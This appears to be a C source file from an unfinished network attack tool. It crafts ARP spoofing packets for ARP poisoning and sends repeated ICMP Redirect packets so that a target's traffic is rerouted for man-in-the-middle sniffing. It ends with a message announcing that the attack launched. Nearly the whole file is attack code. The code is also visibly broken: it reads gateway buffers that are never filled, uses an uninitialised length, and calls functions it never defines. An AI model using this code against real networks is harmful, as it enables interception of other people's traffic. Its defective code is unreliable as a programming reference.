/********************** active sniffing TODO *****************************/

// the purpose would be to to send various frames/packets to perform MITM sniffing with packets forwarding
// with ARP poisonning, IGMP snooping etc... in progress

// crafting our own ARP spoofing packet to perform ARP poisonning to the target address
// it would be a broadcast response or a selective response to a real ARP querry

#include "inject.h"

unsigned char* pack_arp_spoofing_packet(unsigned char* target_mac, unsigned char* target_ip, unsigned char* src_mac,
    unsigned char* src_ip, unsigned char* arp_opcode){

    unsigned char arp_hardware[2] = {0x00, 0x01};
    unsigned char arp_ether_type[2] = {0x08, 0x06};
    unsigned char arp_proto[2] = {0x08, 0x00};
    unsigned char hardware_len = MAC_LENGTH;
    unsigned char protocol_len = IPV4_LENGTH;

    unsigned char* arp_spoofing_packet = malloc(ARP_SPOOFING_PACKET_SIZE);

    if (arp_spoofing_packet == NULL){
        fprintf(stderr, "ERROR : memory allocation error for arp packet\n");
        return arp_spoofing_packet;
    }

    memset(arp_spoofing_packet, 0, ARP_SPOOFING_PACKET_SIZE);

    memcpy(arp_spoofing_packet, target_mac, MAC_LENGTH);
    memcpy(arp_spoofing_packet + 6, src_mac, MAC_LENGTH);
    memcpy(arp_spoofing_packet + 12, arp_ether_type, 2);
    memcpy(arp_spoofing_packet + 14, arp_proto, 2);
    memcpy(arp_spoofing_packet + 16, arp_hardware, 2);
    memcpy(arp_spoofing_packet + 18, &hardware_len, 1);
    memcpy(arp_spoofing_packet + 19, &protocol_len, 1);
    memcpy(arp_spoofing_packet + 20, arp_opcode, 2);
    memcpy(arp_spoofing_packet + 22, src_mac, MAC_LENGTH);
    memcpy(arp_spoofing_packet + 28, src_ip, IPV4_LENGTH);
    memcpy(arp_spoofing_packet + 32, target_mac, MAC_LENGTH);
    memcpy(arp_spoofing_packet + 38, target_ip, IPV4_LENGTH);

    return arp_spoofing_packet;

}

// get device index from device name

int get_device_index(int sock, const char* device_name) {
    
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));

    strncpy(ifr.ifr_name, device_name, sizeof(ifr.ifr_name));
    
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0){
        fprintf(stderr, "ERROR : Couldn't get interface index\n");
        return -1;
    }

    return ifr.ifr_ifindex;
}

// creates and set up socket (setsockopt() etc...) from an interface name to bind with

int init_arp_sock(const char *device_name, int* dev_index){

    int sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));

    if (sock == -1) {
        fprintf(stderr, "ERROR : Couln't create socket\n");
        return -1;
    }

    // getting interface index and setting it to god mode level

    int device_index = get_device_index(sock, device_name);

    assert(device_index != -1);

    dev_index = &device_index;

    //assert(bind_sock(sock, itf_index) == 0);

    return sock;

}

/******************************* ICMP Redirect ******************************/

int create_icmp_sock(int ttl){

    int icmp_sock;

    icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    if (icmp_sock < 0 ) {
        fprintf(stderr, "ERROR : Couln't create socket\n");
        return -1;
    }

    // setting time to live

    if ( setsockopt(icmp_sock, SOL_IP, IP_TTL, &ttl, sizeof(ttl)) != 0){
        fprintf(stderr, "ERROR : Set TTL option\n");
        return -1;
    }

    // setting nonblocking mode

    if ( fcntl(icmp_sock, F_SETFL, O_NONBLOCK) != 0 ){
        fprintf(stderr, "ERROR : Request nonblocking I/O\n");
        return -1;
    }

    return icmp_sock;
}


unsigned short cksum(unsigned short *addr, int len) {

    int sum = 0;
    unsigned short res = 0;
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    if( len == 1) {
        *((unsigned char *)(&res)) = *((unsigned char *)addr);
        sum += res;
    }
    sum = (sum >>16) + (sum & 0xffff);
    sum += (sum >>16);
    res = ~sum;
    return res;
}


unsigned char* send_icmp_packet(unsigned char *cur_packet, int ttl, struct sockaddr_in* target){

    char new_gateway[1024], current_gateway[1024];
    unsigned char* nullptr;
    nullptr = NULL;
    
    struct sockaddr_ll socket_address;

    struct iphdr* ip_struct = (struct iphdr*)(cur_packet + 14);

    icmp_packet* packet = malloc(sizeof(icmp_packet));
    if (packet == NULL){
        fprintf(stderr, "ERROR : Could't allocate memory for icmp packet\n");
        return nullptr;
    }

    int len = 14 + 28 + (ip_struct->ihl << 2) + 8;

    for (int i = 0; i < 6; ++i) socket_address.sll_addr[i] = packet->eth.h_dest[i] = cur_packet[i + 6];
    memset(packet->eth.h_source, 0, sizeof(packet->eth.h_source));
    packet->eth.h_proto = htons(ETH_P_IP);

    packet->ip.version = 4;
    packet->ip.ihl = 5;
    packet->ip.tos = 0;
    packet->ip.tot_len = htons(len - 14);
    packet->ip.id = getpid();
    packet->ip.frag_off = 0;
    packet->ip.ttl = ttl;
    packet->ip.protocol = IPPROTO_ICMP;
    packet->ip.check = 0;

    target->sin_addr = *(struct in_addr*)&ip_struct->saddr;
    packet->ip.daddr = target->sin_addr.s_addr;

    if (inet_aton(current_gateway, &target->sin_addr) == 0) {
        fprintf(stderr, "ERROR : Bad ip address %s\n", current_gateway);
        free(packet);
        return nullptr;
    }

    packet->ip.saddr = target->sin_addr.s_addr;
    packet->ip.check = in_cksum((unsigned short *)&packet->ip, 20);

    packet->icmp.type = ICMP_REDIRECT;
    packet->icmp.code = 1;
    packet->icmp.checksum = 0;

    if (inet_aton(new_gateway, &target->sin_addr) == 0) {
        fprintf(stderr, "ERROR : Bad ip address %s\n", new_gateway);
        free(packet);
        return nullptr;
    }

    packet->icmp.un.gateway = target->sin_addr.s_addr;

    for (int i = 0; i < (ip_struct->ihl << 2) + 8; ++ i)  packet->data[i] = cur_packet[14 + i];

    packet->icmp.checksum = cksum((unsigned short *)&packet->icmp, 8 + (ip_struct->ihl << 2) + 8);

    target->sin_addr = *(struct in_addr*)&ip_struct->saddr;

    return (unsigned char*)packet;
}


int start_icmp_snooping(unsigned char* current_packet, struct sockaddr_in* target, int packet_len, int ttl, int max_packets, int sleep_time){

    opt_struct* opt = malloc(sizeof(opt_struct));

    if (opt == NULL){
        fprintf(stderr, "ERROR : Could't allocate memory for icmp options struct\n");
        return -1;
    }

    memset(opt, 0, sizeof(opt_struct));

    opt->ttl = ttl;
    opt->packets_nbr = max_packets;
    opt->sleep_time = sleep_time;
    opt->packet_size = packet_len;
    memcpy(opt->target_addr, target, sizeof(struct sockaddr_in));

    opt->socket = init_icmp_sock(ttl);
    assert(opt->socket != -1);

    unsigned char *temp = send_icmp_packet(current_packet, ttl, opt->target_addr);
    assert(temp != NULL);
    memcpy(opt->packet, temp, opt->packet_size);

    pthread_t thread_id;

    if(pthread_create(&thread_id , NULL, connection_handler, (void*)&opt) < 0){
        fprintf(stderr, "ERROR : Could not create thread\n");
        free(opt->packet);
        free(opt);
        return -1;
    }

    printf("ICMP Redirect attack launched successfully !\n");

    return 0;

}


void *connection_handler(void* opt_s){

    opt_struct* opt = (opt_struct*)opt_s;
    int sock = *(int*)&opt->socket;
    int sleep_mode = *(int*)&opt->sleep_time;
    int max_packets = *(int*)&opt->packets_nbr;
    int len = opt->packet_size;
    int recv_len;

    while(max_packets--){

        if (sendto(sock, opt->packet, recv_len, 0, (struct sockaddr*)&opt->target_addr, (socklen_t)len) == -1){
            max_packets = 0;
            free(opt);
        }

        sleep(sleep_mode);
    }

    free(opt->packet);
    free(opt);

}
